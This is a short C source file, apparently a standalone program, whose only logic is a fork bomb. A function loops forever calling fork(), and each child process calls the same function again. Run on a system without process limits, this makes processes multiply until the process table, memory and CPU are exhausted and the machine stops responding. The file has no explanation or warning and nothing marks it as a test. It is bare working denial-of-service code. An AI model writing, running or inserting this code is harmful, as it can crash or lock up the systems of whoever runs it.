#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/param.h>
#include <stdlib.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>

void func() {
    while(1) {
        int pid = fork();
        if(pid == 0) {
            func();
        }
    }
}

int main()
{
    func();

    return 0;
}
